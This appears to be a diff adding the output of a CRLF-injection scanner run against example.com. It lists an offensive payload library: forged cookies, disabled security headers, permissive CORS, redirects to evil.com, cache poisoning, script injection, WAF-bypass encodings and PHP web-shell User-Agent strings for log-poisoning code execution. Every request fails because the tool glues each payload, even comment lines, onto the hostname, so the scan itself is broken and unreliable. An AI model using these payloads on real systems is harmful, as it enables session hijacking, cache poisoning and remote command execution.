@@ -1,0 +1,287 @@
+CRLF Scan Report
+Target: https://example.com
+
+Payload: ###############################################
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)
+Headers: {}
+
+Payload: #  CRLF Injection Payload Library – v2.0
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label empty or too long)
+Headers: {}
+
+Payload: #  Author: Gray (Subir) – CRLF Injector Project
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)
+Headers: {}
+
+Payload: ###############################################
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)
+Headers: {}
+
+Payload: ########## 1. BASIC COOKIE INJECTION ##########
+Status: ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%201.%20basic%20cookie%20injection%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Set-Cookie: hacker=owned
+Status: ERROR: Cannot connect to host example.comset-cookie%3a%20hacker%3downed:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Set-Cookie: admin=true
+Status: ERROR: Cannot connect to host example.comset-cookie%3a%20admin%3dtrue:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Set-Cookie: session=pwned
+Status: ERROR: Cannot connect to host example.comset-cookie%3a%20session%3dpwned:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Set-Cookie: role=superuser
+Status: ERROR: Cannot connect to host example.comset-cookie%3a%20role%3dsuperuser:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 2. SECURITY HEADER OVERRIDES ##########
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)
+Headers: {}
+
+Payload: X-Frame-Options: ALLOWALL
+Status: ERROR: Cannot connect to host example.comx-frame-options%3a%20allowall:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: X-Content-Type-Options: insecure
+Status: ERROR: Cannot connect to host example.comx-content-type-options%3a%20insecure:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: X-XSS-Protection: 0
+Status: ERROR: Cannot connect to host example.comx-xss-protection%3a%200:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Referrer-Policy: unsafe-url
+Status: ERROR: Cannot connect to host example.comreferrer-policy%3a%20unsafe-url:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Strict-Transport-Security: max-age=0
+Status: ERROR: Cannot connect to host example.comstrict-transport-security%3a%20max-age%3d0:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Content-Security-Policy: unsafe-inline
+Status: ERROR: Cannot connect to host example.comcontent-security-policy%3a%20unsafe-inline:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Permissions-Policy: interest-cohort=*
+Status: ERROR: Cannot connect to host example.compermissions-policy%3a%20interest-cohort%3d%2a:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 3. CORS MISCONFIG PAYLOADS ##########
+Status: ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%203.%20cors%20misconfig%20payloads%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Access-Control-Allow-Origin: *
+Status: ERROR: Cannot connect to host example.comaccess-control-allow-origin%3a%20%2a:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Access-Control-Allow-Credentials: true
+Status: ERROR: Cannot connect to host example.comaccess-control-allow-credentials%3a%20true:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Access-Control-Allow-Methods: GET,POST,OPTIONS
+Status: ERROR: Cannot connect to host example.comaccess-control-allow-methods%3a%20get%2cpost%2coptions:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Access-Control-Max-Age: 999999
+Status: ERROR: Cannot connect to host example.comaccess-control-max-age%3a%20999999:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 4. REDIRECTION PAYLOADS ##########
+Status: ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%204.%20redirection%20payloads%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Location: https://evil.com
+Status: ERROR: Cannot connect to host example.comlocation%3a%20https%3a:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Location: http://attacker.test
+Status: ERROR: Cannot connect to host example.comlocation%3a%20http%3a:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Location: javascript:alert('XSS')
+Status: ERROR: Cannot connect to host example.comlocation%3a%20javascript%3aalert%28%27xss%27%29:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Location: //evil.com
+Status: ERROR: Cannot connect to host example.comlocation%3a%20:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 5. CACHE POISONING ##########
+Status: ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%205.%20cache%20poisoning%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Cache-Control: public,max-age=999999
+Status: ERROR: Cannot connect to host example.comcache-control%3a%20public%2cmax-age%3d999999:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: X-Cache: HIT
+Status: ERROR: Cannot connect to host example.comx-cache%3a%20hit:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Surrogate-Control: max-age=999999
+Status: ERROR: Cannot connect to host example.comsurrogate-control%3a%20max-age%3d999999:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Age: 0
+Status: ERROR: Cannot connect to host example.comage%3a%200:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Expires: Wed, 21 Oct 2050 07:28:00 GMT
+Status: ERROR: Cannot connect to host example.comexpires%3a%20wed%2c%2021%20oct%202050%2007%3a28%3a00%20gmt:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 6. HTML / BODY INJECTION ##########
+Status: ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%206.%20html%20:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Content-Type: text/html
+Status: ERROR: Cannot connect to host example.comcontent-type%3a%20text:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: <h1>Injected by CRLF Exploit</h1>
+Status: ERROR: Cannot connect to host example.com%3ch1%3einjected%20by%20crlf%20exploit%3c:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: <script>alert('Header Injection')</script>
+Status: ERROR: Cannot connect to host example.com%3cscript%3ealert%28%27header%20injection%27%29%3c:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 7. LOG POISONING (RCE CHAINS) ##########
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)
+Headers: {}
+
+Payload: User-Agent: <?php system($_GET['cmd']); ?>
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)
+Headers: {}
+
+Payload: User-Agent: <?php echo shell_exec($_GET['cmd']); ?>
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)
+Headers: {}
+
+Payload: User-Agent: <script>alert('XSS')</script>
+Status: ERROR: Cannot connect to host example.comuser-agent%3a%20%3cscript%3ealert%28%27xss%27%29%3c:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: User-Agent: curl-pwned-by-Gray
+Status: ERROR: Cannot connect to host example.comuser-agent%3a%20curl-pwned-by-gray:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 8. RESPONSE SPLITTING ##########
+Status: ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%208.%20response%20splitting%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: HTTP/1.1 200 OK
+Status: ERROR: Cannot connect to host example.comhttp:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Content-Type: text/html
+Status: ERROR: Cannot connect to host example.comcontent-type%3a%20text:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: <h2>Split Response Successful</h2>
+Status: ERROR: Cannot connect to host example.com%3ch2%3esplit%20response%20successful%3c:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: HTTP/1.1 302 Found
+Status: ERROR: Cannot connect to host example.comhttp:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Location: https://evil.com
+Status: ERROR: Cannot connect to host example.comlocation%3a%20https%3a:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 9. WAF/IDS BYPASS PAYLOADS ##########
+Status: ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%209.%20waf:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Set-Cookie:%20bypass=1
+Status: ERROR: Cannot connect to host example.comset-cookie%3a%2520bypass%3d1:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Set-Cookie:+tabbed=ok
+Status: ERROR: Cannot connect to host example.comset-cookie%3a%2btabbed%3dok:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Set-Cookie:%09tab_char
+Status: ERROR: Cannot connect to host example.comset-cookie%3a%2509tab_char:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: X-Test:%0AInjected
+Status: ERROR: Cannot connect to host example.comx-test%3a%250ainjected:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Injected:%0D%0ASet-Cookie:WAF=Bypassed
+Status: ERROR: Cannot connect to host example.cominjected%3a%250d%250aset-cookie%3awaf%3dbypassed:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 10. MULTI‑HEADER CHAINS ##########
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)
+Headers: {}
+
+Payload: Set-Cookie: session=owned
+Status: ERROR: Cannot connect to host example.comset-cookie%3a%20session%3downed:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Access-Control-Allow-Origin: *
+Status: ERROR: Cannot connect to host example.comaccess-control-allow-origin%3a%20%2a:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Cache-Control: public,max-age=9999
+Status: ERROR: Cannot connect to host example.comcache-control%3a%20public%2cmax-age%3d9999:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Set-Cookie: admin=true
+Status: ERROR: Cannot connect to host example.comset-cookie%3a%20admin%3dtrue:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: X-Frame-Options: ALLOWALL
+Status: ERROR: Cannot connect to host example.comx-frame-options%3a%20allowall:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: X-XSS-Protection: 0
+Status: ERROR: Cannot connect to host example.comx-xss-protection%3a%200:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 11. ADVANCED CHAINED EXPLOITS ##########
+Status: ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)
+Headers: {}
+
+Payload: Content-Type: text/html
+Status: ERROR: Cannot connect to host example.comcontent-type%3a%20text:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: X-Frame-Options: ALLOWALL
+Status: ERROR: Cannot connect to host example.comx-frame-options%3a%20allowall:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: X-Content-Type-Options: insecure
+Status: ERROR: Cannot connect to host example.comx-content-type-options%3a%20insecure:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: <h1>Advanced Chain Executed</h1>
+Status: ERROR: Cannot connect to host example.com%3ch1%3eadvanced%20chain%20executed%3c:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: ########## 12. DEBUG / SERVERTOKEN CORRUPTION ##########
+Status: ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%2012.%20debug%20:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Server: Apache
+Status: ERROR: Cannot connect to host example.comserver%3a%20apache:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Server: Nginx
+Status: ERROR: Cannot connect to host example.comserver%3a%20nginx:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: Server: GrayInjector
+Status: ERROR: Cannot connect to host example.comserver%3a%20grayinjector:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: X-Powered-By: PHP/999.0
+Status: ERROR: Cannot connect to host example.comx-powered-by%3a%20php:443 ssl:default [Name or service not known]
+Headers: {}
+
